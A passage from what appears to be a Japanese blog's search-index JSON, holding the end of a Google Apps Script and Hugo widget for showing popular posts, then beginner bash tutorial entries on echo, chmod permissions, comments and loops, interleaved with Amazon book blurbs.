1)[0]; return rows.map(row =\u0026gt; { let obj = {}; row.map((item, index) =\u0026gt; obj[keys[index]] = item); return obj; }); } function doGet(e) { let data = getData(e.parameter.sheetname); return ContentService.createTextOutput(JSON.stringify(data, null, 2)).setMimeType(ContentService.MimeType.JSON); } function getDate(type) { let calc = \u0026#39;d\u0026#39;; switch(type) { case \u0026#34;month\u0026#34;: calc = \u0026#39;M\u0026#39;; break; case \u0026#34;year\u0026#34;: calc = \u0026#39;y\u0026#39;; break; default: calc = \u0026#39;d\u0026#39;; break; } const d1 = dayjs.dayjs().locale(\u0026#39;ja\u0026#39;); return {start: d1.subtract(1, calc).format(\u0026#39;YYYY-MM-DD\u0026#39;), end: d1.format(\u0026#39;YYYY-MM-DD\u0026#39;)}; } function getGoogleAnalytics(name) { const id = \u0026#34;ga:ビューID\u0026#34;; const date = getDate(name); const response = AnalyticsReporting.Reports.batchGet({ reportRequests: [{ viewId: id, dateRanges: [{startDate:date.start,endDate: date.end}], samplingLevel: \u0026#39;LARGE\u0026#39;, metrics: [ {expression: \u0026#39;ga:pageviews\u0026#39;}, {expression: \u0026#39;ga:sessions\u0026#39;}, {expression: \u0026#39;ga:users\u0026#39;}, ], dimensions: [ {name: \u0026#39;ga:pagePath\u0026#39;} ], orderBys: [{ fieldName: \u0026#39;ga:pageviews\u0026#39;, sortOrder: \u0026#34;DESCENDING\u0026#34;, }], }] }); let rows = JSON.parse(response).reports[0].data.rows; rows = rows.filter(f =\u0026gt; /posts/.test(f.dimensions[0])).map(f =\u0026gt; { return f.dimensions.concat(f.metrics[0].values); }); let sheet = SpreadsheetApp.getActive().getSheetByName(name); sheet.clear(); rows.unshift([\u0026#34;link\u0026#34;, \u0026#34;pv\u0026#34;, \u0026#39;session\u0026#39;, \u0026#39;users\u0026#39;]); sheet.getRange(1, 1, rows.length, rows[0].length).setValues(rows); } function setMonth() { getGoogleAnalytics(\u0026#39;month\u0026#39;); } function setDay() { getGoogleAnalytics(\u0026#39;day\u0026#39;); } function setYear() { getGoogleAnalytics(\u0026#39;year\u0026#39;); } function all() { setDay(); setMonth(); setYear(); } Hugoで人気の記事を表示する \u0026lt;aside class=\u0026#34;widget archives sidearticle-contents--wrapper\u0026#34; id=\u0026#34;popular-articles--month\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;contents-area\u0026#34;\u0026gt; \u0026lt;header\u0026gt;\u0026lt;h2 class=\u0026#34;section-title\u0026#34;\u0026gt;人気の記事（1ヶ月以内）\u0026lt;/h2\u0026gt;\u0026lt;/header\u0026gt; \u0026lt;div class=\u0026#34;sidearticle-contents\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex article-list--tile\u0026#34;\u0026gt; {{ $page := .Site.Pages }} {{ range first .Site.Params.widgets.populerArticles.limit $json }} {{ $article := index (where $page \u0026#34;.RelPermalink\u0026#34; \u0026#34;eq\u0026#34; .link ) 0 }} {{ if $article }} \u0026lt;article\u0026gt; \u0026lt;h3 class=\u0026#34;article-title\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;{{ .context.RelPermalink }}\u0026#34;\u0026gt;{{- .context.Title -}}\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt; \u0026lt;/article\u0026gt; {{ end }} {{ end }} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/aside\u0026gt; 書籍の紹介 Googleアナリティクス プロフェッショナル　～分析・施策のアイデアを生む最強リファレンス ウェブ制作者から、マーケター、ウェブアナリストまで必携の1冊 「Googleアナリティクスはどこへ向かうのか?進化し続けるツールのポテンシャルを最大限に引き出したときに、新しい分析や施策のアイディアが生まれる」\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 Google Apps Script目的別リファレンス 実践サンプルコード付き Excelのマクロに似た「スクリプト」を書けば、Gmailや「スプレッドシート」などのGoogleサービスを更に効率的に、思うように使えます。そのスクリプトを書いて実行するプログラミング環境が、Google Apps Script(GAS)。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T11:54:15+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/analytics_hu3c7150185aea2714a4cee994a799664f_79251_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-07-01-wyoshi/","title":"GASとアナリティクスで、Hugoに人気記事を表示させる"},{"content":"Hello World はじめてのbashコマンド「echo」\nターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。\n$ echo \u0026#34;Hello, World\u0026#34; Hello, World $ はじめてのbashスクリプト「vim」\n$ vim HelloWorld.sh ＜空のvim HelloWorld.sh が開きます＞ vimで開いたHelloWorld.shを編集します。\n#!/bin/bash echo \u0026#34;Hello World\u0026#34;; はじめての実行権限「chmod」\nbashファイルは2つの方法で実行できます。\n１．bashコマンドを使用する方法、\n２．bashファイルに実行権限を設定し、ファイルを実行する方法\n一つ目の方法「bashコマンドを使用する」\n$ bash HelloWorld.sh もう一つの方法「chmodで実行権限を付与する」\n# +x で実行権限を付与 $ chmod +x HelloWorld.sh # ドット　スラッシュをつけて実行 $ ./HelloWorld.sh ヒント $ ./ でファイルを実行する場合、ソースファイルの先頭行に記載されている #!/bin/bash\nという記述をつかって実行されます。\n$ ./\u0026lt;ファイル名\u0026gt;\nで実行した場合は、bashコマンド（/bin/bash )を使って実行することを、ソースファイルの先頭で宣言している。という事になります。\nこのソースファイルの1行目の記述を「シェバン」と言います。 /usr/local/bin/awk\nにあるコマンドを使ってソースファイルを実行( ./\u0026lt;ファイル名\u0026gt;）したい場合は、ソースファイルの先頭行に\n#!/usr/local/bin/awk\nと、記述します。\nchmod の実行権限には +x で実行権限を付与する方法の他、0755 などの数字で付与する場合もあります。\nこれらをパーミッションと言います。\nヒント 考え方ですが、bashコマンドでファイルを実行する場合のメリットは、ファイルに実行権限をやみくもに与える必要がないことです。 同時に、第三者が簡単にファイルを実行できる事を防ぐ、自分自身が誤ってファイルを実行してしまうというケアレスミスを防ぐことができます。 実行権限を与える方法は、一般的ではありますが、注意も必要です。 パーミッションの確認\nターミナルのコマンドでカレントディレクトリ内のファイルやディレクトリの情報を確認します。\n$ls -l 上記のコマンドを実行すると、以下のような一覧が表示されるかと思います。\n-rw-r--r-- 1 user group 9 1月 1 00:00 hoge.txt drwxr-xr-x 6 user group 20480 1月 1 00:00 ダウンロード パーミッションの読み方\n「-rw-r\u0026ndash;r\u0026ndash;」や「drwxr-xr-x」の先頭の謎の10文字についてですが、\n最初の１文字目はファイル種別を表しています。\n-rw-r\u0026ndash;r\u0026ndash;\n種別意味 -ファイル dディレクトリ lシンボリックリンク 2文字目から4文字目はファイルの所有者に対する権限を表し、\n5文字目から7文字目はファイルの所有グループに対する権限を表し、\n8文字目から10文字目はその他に対する権限を表しています\n上記から-rw-r\u0026ndash;r\u0026ndash;は、\n「ファイル種別」が「ファイル」であり、\n「所有者」に「読み取り」と「書き込み」の権限があり、\n「所有グループ」に「読み取り」の権限があり、\n「その他」に「読み取り」の権限があることを示しています。\ndrwxr-xr-xは、\n「ファイル種別」が「ディレクトリ」であり、\n「所有者」に「読み取り」と「書き込み」と「実行」の権限があり、\n「所有グループ」に「読み取り」と「実行」の権限があり、\n「その他」に「読み取り」と「実行」の権限があることを示しています。\nアクセス権限の変更\nアクセス権限を変更する方法について記載します。\nパーミッションの変更には chmodコマンドを使用します。\n数値で指定する\n$ ls -l　-rw-r--r-- 1 user group 9 1月 1 00:00 hoge.txt $ chmod 764 hoge.txt $ ls -l -rwxrw-r-- 1 user group 9 1月 1 00:00 hoge.txt 上記のコマンドはhoge.txtに対してパーミッションの確認→変更→確認を行っています。\n$ chmod 764 hoge.txt に関して説明していきます。\nファイルのパーミッションの変更は以下の通りコマンドを実行すれば可能です。\nchmod モード 対象ファイル名 モードの数字について\nモード(数字)モード(アルファベット)権限 4r読み取り 2w書き込み 1x実行 上記の合計値を「所有者」「所有グループ」「その他」の順で入力することでパーミッションを変更することができます。 要するに上記の「764」は 「所有者」に対して「読み取り」「書き込み」「実行」を、 「所有グループ」に対して「読み取り」「書き込み」を、 「その他」に「読み取り」を付与しています。 ヒント 実行したい場合は $ chmod 755 \u0026lt;ファイル名\u0026gt; 読み取りのみを許可し、実行しない場合は $ chmod 644 \u0026lt;ファイル名\u0026gt; 自分だけの読み取りを許可する場合は $ chmod 600 \u0026lt;ファイル名\u0026gt; 通常は上記３種類しか使いません。 CGI などを使う場合は $ chown や $chgrp を組み合わせて使うことが多いです。 $ chmod 777 \u0026lt;ファイル名\u0026gt; というパーミッションを軽率に与えず、上手にコマンドを使いこなすことがセキュリティにつながります。 詳しくはこちら\nhttps://qiita.com/shisama/items/5f4c4fa768642aad9e06\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-01-suzuki/","title":"【１．Hello World】ざっくりわかる「シェルスクリプト」"},{"content":"echo コマンド echoコマンドの使用：\nさまざまなオプションでechoコマンドを使用できます。\n次の例では、いくつかの便利なオプションについて説明します。\nオプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。\n\u0026lsquo;-n\u0026rsquo;オプションは、改行なしでテキストを印刷するために使用され、\u0026rsquo;-e\u0026rsquo;オプションは、出力からバックスラッシュ文字を削除するために使用されます。\n\u0026rsquo;echo_example.sh\u0026rsquo;という名前の新しいbashファイルを作成し、次のスクリプトを追加します。\n#!/bin/bash echo \u0026#34;改行付きのテキストの印刷\u0026#34;; echo -n \u0026#34;改行なしのテキストの印刷\u0026#34;; echo -e \u0026#34;\\n削除\\tバックスラッシュ\\t文字\\n\u0026#34;; bashコマンドでファイルを実行します。\n$ bash echo_example.sh 改行付きのテキストの印刷 改行なしのテキストの印刷 削除\tバックスラッシュ\t文字 $ ヒント echo の利用例は果てしない。ここで説明してもだれも読みはしないだろう。なので、概要の抜粋を説明する echo でよく使われるオプションは以下の通り\nオプション\t意味\n-n\t最後の改行を出力しない -e\tエスケープシーケンスを解釈する -E\tエスケープシーケンスを解釈しない（デフォルト） エスケープシーケンスとは、上記のバックスラッシュのことだ。\n以下の4つを覚えておくだけでおおよそは事足りる。 オプション 意味\n\\r\tキャリッジリターン \\n\t改行（フォームフィード＋キャリッジリターン） \\t\t水平タブ \\\tバックスラッシュ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-02-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-02-suzuki/","title":"【２．echo コマンド】ざっくりわかる「シェルスクリプト」"},{"content":"コメント コメントの使用\n「#」記号は、bashスクリプトに1行コメントを追加するために使用されます。\n\u0026lsquo;comment_example.sh\u0026rsquo;という名前の新しいファイルを作成し、1行コメント付きの次のスクリプトを追加します。\n#!/bin/bash #2つの数値をsumに追加します ((sum=25+35)); #結果を出力します echo \u0026#34;$sum\u0026#34;; bashコマンドでファイルを実行します。\n$ bash comment_example.sh 60 $ ヒント 複数行コメントに関しては次の章で説明します。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-03-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-03-suzuki/","title":"【３．コメント】ざっくりわかる「シェルスクリプト」"},{"content":"マルチラインコメント 複数行コメントの使用\nbashではさまざまな方法で複数行コメントを使用できます。\n次の例に簡単な方法を示します。\n\u0026lsquo;multiline-comment.sh\u0026rsquo;という名前の新しいbashを作成し、次のスクリプトを追加します。\nここでは、「:」と「\u0026rsquo;」でbashで複数行コメントを実現しています。\n次のスクリプトは、5の2乗を計算します。\nヒント 「:」と「\u0026rsquo;」の間は半角スペースを入れます。 #!/bin/bash : \u0026#39; 次のスクリプトは、 数値の2乗値5を計算します。 \u0026#39; ((area=5*5)); echo \u0026#34;$area\u0026#34;; bashコマンドでファイルを実行します。\n$ bash multiline-comment.sh 25 $ ヒント 多くの場合、マルチラインコメントの存在は知られていない。 ほとんどの人は、行頭に「#」をならべて複数行コメントを行う。 それは、過去のメジャーソースコードの冒頭にそうあるからだ。 そう、UNIX/Linuxの開発者のほとんどは、マルチラインコメントを知らないのだ。 今後出てくるであろうファイルの生成に「touch」というコマンドがある。これ実は 「:\u0026gt;ファイル名」で、空のファイルを生成する事ができる。「:」は、”なにもしないことを示す。if文の中で何もしない場合は、以下のように記述する。\nif [ \u0026ldquo;$v\u0026rdquo; -eq 5 ];then\n: # 何もしない fi touchは既にファイルがあれば、そのファイルにはさわらない。\n:\u0026gt; は既にファイルがあれば、そのファイルさえも空にする。 上記 if 文の中の : は　何もしないことを示す。 マルチラインコメントも同じ「:」から始まり、何もしないことを示している。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-04-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-04-suzuki/","title":"【４．マルチラインコメント】ざっくりわかる「シェルスクリプト」"},{"content":"while ループ whileループの使用\nwhileループの使用法を知るために、「while_example.sh」という名前のbashファイルを作成します。\nこの例では、whileループが5回繰り返されます。\ncount変数の値は、各ステップで1ずつ増加します。\ncount変数の値が5になると、whileループは終了します。\n#!/bin/bash valid=true; count=1 while [ \u0026#34;$valid\u0026#34; ];do echo \u0026#34;$count\u0026#34;; if [ \u0026#34;$count\u0026#34; -eq 5 ];then break; fi ((count++)); done bashコマンドでファイルを実行します。\n$ bash while_example.sh 1 2 3 4 5 $ ヒント 上記ソースでトリッキーなのはwhileよりもむしろ ((COUNT++))\nだろう。\nCOUNT = COUNT + 1; count=1\ncount=$(expr $count + 1) # =\u0026gt; 2 let ++count # =\u0026gt; 2 let count++ # =\u0026gt; 3 count=$((++count)) # =\u0026gt; 2 count=$((count++)) # =\u0026gt; 2 count=$((count += 1)) # =\u0026gt; 3 変数に代入する必要がないから $(( )) ではなく、\n(( )) でよい。(( )) の中の変数を表す「$」は記述の必要はない 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-05-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-05-suzuki/","title":"【５．while ループ】ざっくりわかる「シェルスクリプト」"},{"content":"for ループ forループの使用\n基本的なforループ宣言を示します。\n\u0026lsquo;for_example.sh\u0026rsquo;という名前のファイルを作成し、forループを使用して、次のスクリプトを追加します。\nここでは、forループは10回繰り返され、変数のすべての値、counterを1行で出力します。\n#!/bin/bash for((counter=10;counter\u0026gt;0;counter--));do echo -n \u0026#34;$counter \u0026#34;; done printf \u0026#34;\\n\u0026#34; bashコマンドでファイルを実行します。\n$ bash for_example.sh 10 9 8 7 6 5 